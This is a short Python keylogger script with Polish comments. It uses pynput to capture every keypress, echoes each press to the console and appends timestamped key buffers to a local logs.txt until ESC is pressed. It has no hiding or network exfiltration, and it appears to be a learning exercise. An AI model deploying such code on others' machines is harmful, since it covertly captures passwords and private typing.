from pynput import keyboard
from datetime import datetime
import threading
import time


key_buffer = []
lock = threading.Lock() # Blokada


# zapisywanie klawiszy
def save_keys():
    while True:
        time.sleep(10)
        # blokada dla wątkow
        with lock:
            if key_buffer: # Jesli sa dane do zapisywania
                with open("logs.txt", "a") as file:
                    timestamp = datetime.now().strftime("%d/%m/%Y:%H:%M:%S")
                    file.write(f"{timestamp}: {key_buffer}\n")
                    print(f"keybuffer ; {key_buffer}")
                key_buffer.clear() # Czyszczenie buforu po zapisaniu




# Funkcja śledząca klikanie klawiszy
def on_press(key):
    try:
        with lock:
            key_buffer.append(f"{key.char}")
        print(f"Wcisnieto klawisz {key.char}")
    except AttributeError:
        with lock:
            key_buffer.append(f"{key}")
        print(f"niestandardowy klawisz: {key}")


# Funkcja gdy puścimy klawisz
def on_release(key):
    # Printujemy który klawisz został puszczony
    print(f"Puszczony klawisz: {key}")
    # zakończ nasłuchiwanie jeśli wciśniemy ESC
    if key == keyboard.Key.esc:
        return False


# Watek zapisujacy dane
t1 = threading.Thread(target=save_keys, daemon=True)
t1.start()

# Uruchom
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()